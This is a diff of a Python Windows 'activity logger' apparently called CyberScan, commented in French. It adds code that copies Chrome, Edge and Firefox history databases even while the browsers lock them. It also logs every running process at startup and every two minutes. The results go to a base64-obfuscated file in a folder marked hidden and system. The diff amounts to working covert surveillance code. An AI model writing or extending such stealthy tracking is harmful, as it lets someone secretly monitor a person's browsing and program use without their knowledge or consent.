@@ -15,16 +15,89 @@ import logging
 import subprocess
 import ctypes
 import threading
+import tempfile
 from datetime import datetime, timedelta
 
 NO_WINDOW = 0x08000000  # subprocess.CREATE_NO_WINDOW
 
-LOG_DIR = os.path.join(os.environ.get('PROGRAMDATA', r'C:\ProgramData'), 'CyberScan')
+# ── Constantes Win32 pour copie partagée ──────────────────────────
+_GENERIC_READ       = 0x80000000
+_FILE_SHARE_READ    = 0x00000001
+_FILE_SHARE_WRITE   = 0x00000002
+_OPEN_EXISTING      = 3
+_FILE_FLAG_SEQUENTIAL_SCAN = 0x08000000
+
+
+def _copy_locked_file(src: str, dst: str) -> bool:
+    """Copie un fichier même s'il est verrouillé par un autre processus
+    (ex: historique Chrome/Edge ouvert). Utilise CreateFile avec
+    FILE_SHARE_READ|FILE_SHARE_WRITE pour contourner le verrou.
+    Retourne True si la copie a réussi, False sinon.
+    """
+    kernel32 = ctypes.windll.kernel32
+    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
+
+    handle = kernel32.CreateFileW(
+        src,
+        _GENERIC_READ,
+        _FILE_SHARE_READ | _FILE_SHARE_WRITE,
+        None,
+        _OPEN_EXISTING,
+        _FILE_FLAG_SEQUENTIAL_SCAN,
+        None
+    )
+    if handle == INVALID_HANDLE_VALUE:
+        return False
+    try:
+        chunk_size = 1 << 20  # 1 MiB
+        buf = ctypes.create_string_buffer(chunk_size)
+        bytes_read = ctypes.c_ulong(0)
+        with open(dst, 'wb') as out:
+            while True:
+                ok = kernel32.ReadFile(handle, buf, chunk_size,
+                                       ctypes.byref(bytes_read), None)
+                if not ok or bytes_read.value == 0:
+                    break
+                out.write(buf.raw[:bytes_read.value])
+        return True
+    except Exception:
+        return False
+    finally:
+        kernel32.CloseHandle(handle)
+
+# ── Chemin du fichier de log ───────────────────────────────────────
+# Priorité 1 : ProgramData (visible par tous les utilisateurs de la machine)
+# Priorité 2 : AppData (si ProgramData nécessite des droits admin)
+def _get_log_dir():
+    """Retourne le répertoire de log accessible en écriture."""
+    for base in [
+        os.environ.get('APPDATA', ''),
+        os.environ.get('PROGRAMDATA', r'C:\ProgramData'),
+        os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Roaming'),
+        tempfile.gettempdir(),
+    ]:
+        if not base:
+            continue
+        candidate = os.path.join(base, 'CyberScan')
+        try:
+            os.makedirs(candidate, exist_ok=True)
+            # Test d'écriture
+            test_file = os.path.join(candidate, '.write_test')
+            with open(test_file, 'w') as f:
+                f.write('ok')
+            os.unlink(test_file)
+            return candidate
+        except Exception:
+            continue
+    # Fallback absolu : dossier temp
+    return tempfile.gettempdir()
+
+LOG_DIR  = _get_log_dir()
 LOG_FILE = os.path.join(LOG_DIR, '.cs_activity.dat')
 
-FILE_ATTRIBUTE_HIDDEN = 0x02
-FILE_ATTRIBUTE_SYSTEM = 0x04
-FILE_ATTRIBUTE_READONLY = 0x01
+FILE_ATTRIBUTE_HIDDEN   = 0x02
+FILE_ATTRIBUTE_SYSTEM   = 0x04
+FILE_ATTRIBUTE_NORMAL   = 0x80   # ← FIX : 0x80 pas 0 !
 
 # Processus système à ignorer (ne pas journaliser)
 SYSTEM_PROCESSES = {
@@ -56,28 +129,30 @@ _lock = threading.Lock()
 # Gestion fichier protégé
 # ============================================================
 def _ensure_dir():
-    """Crée le répertoire de logs et le rend invisible."""
+    """Crée le répertoire de logs (déjà garanti accessible par _get_log_dir)."""
     os.makedirs(LOG_DIR, exist_ok=True)
     try:
-        ctypes.windll.kernel32.SetFileAttributesW(LOG_DIR, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
-    except:
+        ctypes.windll.kernel32.SetFileAttributesW(
+            LOG_DIR, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
+    except Exception:
         pass
 
 
 def _protect_file(path):
-    """Rend le fichier caché + système + lecture seule."""
+    """Rend le fichier caché + système (SANS lecture seule — éa bloquait les écritures)."""
     try:
         ctypes.windll.kernel32.SetFileAttributesW(
-            path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY)
-    except:
+            path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
+    except Exception:
         pass
 
 
 def _unprotect_file(path):
     """Retire la protection pour écriture."""
     try:
-        ctypes.windll.kernel32.SetFileAttributesW(path, 0)
-    except:
+        # FILE_ATTRIBUTE_NORMAL = 0x80  (pas 0 qui est invalide sur Windows)
+        ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL)
+    except Exception:
         pass
 
 
@@ -93,18 +168,25 @@ def _read_log():
             return {"apps": [], "last_scan": None}
         data = json.loads(base64.b64decode(encoded).decode('utf-8'))
         return data
-    except:
+    except Exception as e:
+        logging.warning(f"[ActivityLogger] Lecture fichier log échouée: {e}")
         return {"apps": [], "last_scan": None}
 
 
 def _write_log(data):
-    """Écrit le fichier de logs (protégé et obfusqué)."""
-    _ensure_dir()
-    _unprotect_file(LOG_FILE)
-    encoded = base64.b64encode(json.dumps(data, default=str).encode('utf-8')).decode('utf-8')
-    with open(LOG_FILE, 'w', encoding='utf-8') as f:
-        f.write(encoded)
-    _protect_file(LOG_FILE)
+    """Écrit le fichier de logs."""
+    try:
+        _ensure_dir()
+        _unprotect_file(LOG_FILE)
+        encoded = base64.b64encode(
+            json.dumps(data, default=str).encode('utf-8')
+        ).decode('utf-8')
+        with open(LOG_FILE, 'w', encoding='utf-8') as f:
+            f.write(encoded)
+        _protect_file(LOG_FILE)
+        logging.info(f"[ActivityLogger] Log écrit → {LOG_FILE} ({len(data.get('apps', []))} apps)")
+    except Exception as e:
+        logging.error(f"[ActivityLogger] ERREUR écriture log: {e} — chemin: {LOG_FILE}")
 
 
 # ============================================================
@@ -181,12 +263,16 @@ def _get_browser_history(since_str=None):
             continue
         tmp_path = os.path.join(LOG_DIR, f'.tmp_{browser.lower()}_hist')
         try:
-            # Copie non bloquante : si le fichier est verrouillé, on skip
-            try:
-                shutil.copy2(hist_path, tmp_path)
-            except (PermissionError, OSError):
-                logging.debug(f"{browser}: fichier historique verrouillé, ignoré")
-                continue
+            # Copie partagée : fonctionne même quand le navigateur est ouvert
+            copied = _copy_locked_file(hist_path, tmp_path)
+            if not copied:
+                # Fallback classique si le navigateur est fermé
+                try:
+                    shutil.copy2(hist_path, tmp_path)
+                    copied = True
+                except (PermissionError, OSError):
+                    logging.debug(f"{browser}: fichier historique inaccessible, ignoré")
+                    continue
             conn = sqlite3.connect(tmp_path, timeout=5)
             conn.text_factory = str
             cursor = conn.cursor()
@@ -227,11 +313,15 @@ def _get_browser_history(since_str=None):
                 continue
             tmp_path = os.path.join(LOG_DIR, '.tmp_ff_hist')
             try:
-                try:
-                    shutil.copy2(places, tmp_path)
-                except (PermissionError, OSError):
-                    logging.debug("Firefox: fichier historique verrouillé, ignoré")
-                    continue
+                # Copie partagée pour Firefox également
+                copied = _copy_locked_file(places, tmp_path)
+                if not copied:
+                    try:
+                        shutil.copy2(places, tmp_path)
+                        copied = True
+                    except (PermissionError, OSError):
+                        logging.debug("Firefox: fichier historique inaccessible, ignoré")
+                        continue
                 conn = sqlite3.connect(tmp_path, timeout=5)
                 cursor = conn.cursor()
                 cursor.execute(
@@ -262,6 +352,7 @@ def _get_browser_history(since_str=None):
                     pass
 
     return results
+
 
 
 # ============================================================
@@ -307,14 +398,40 @@ def get_and_clear_activities():
 def _background_logger():
     """Thread de fond : capture les processus toutes les 2 minutes."""
     global _known_processes
-    _known_processes = _snapshot_processes()
+
+    logging.info(f"[ActivityLogger] Démarrage thread — log: {LOG_FILE}")
+
+    try:
+        _known_processes = _snapshot_processes()
+    except Exception as e:
+        logging.error(f"[ActivityLogger] snapshot initial échoué: {e}")
+        _known_processes = set()
+
+    # ── Log initial immédiat de TOUS les processus au démarrage ──
+    if _known_processes:
+        try:
+            with _lock:
+                data = _read_log()
+                now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                existing_names = {a['name'] for a in data.get('apps', [])}
+                added = 0
+                for proc_name in _known_processes:
+                    if proc_name not in existing_names:
+                        data['apps'].append({'name': proc_name, 'first_seen': now})
+                        added += 1
+                _write_log(data)
+                logging.info(f"[ActivityLogger] Log initial: {added} processus ajoutés")
+        except Exception as e:
+            logging.error(f"[ActivityLogger] Erreur log initial: {e}")
 
     while not _logger_stop_event.is_set():
         try:
             _log_new_processes()
         except Exception as e:
-            logging.debug(f"Erreur logger activité: {e}")
+            logging.error(f"[ActivityLogger] Erreur boucle: {e}")
         _logger_stop_event.wait(120)
+
+    logging.info("[ActivityLogger] Thread arrêté.")
 
 
 def start_logging():
